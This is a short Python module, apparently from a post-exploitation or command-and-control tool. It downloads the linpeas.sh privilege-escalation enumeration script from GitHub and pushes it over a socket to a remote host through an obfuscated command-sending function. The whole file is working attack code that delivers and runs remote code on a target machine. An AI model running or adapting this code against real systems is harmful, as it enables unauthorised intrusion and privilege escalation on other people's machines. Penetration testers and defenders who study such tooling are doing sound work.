import urllib.request
import base64

from comm import sendCommandObfuscated

def downloadPeass(url="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"):

    peass = urllib.request.urlopen(url)
    peassStr = ""

    for line in peass:
        peassStr += line.decode('utf-8') + "\n"

    return peassStr

def runPeass(socket):
    sendCommandObfuscated(socket, downloadPeass())
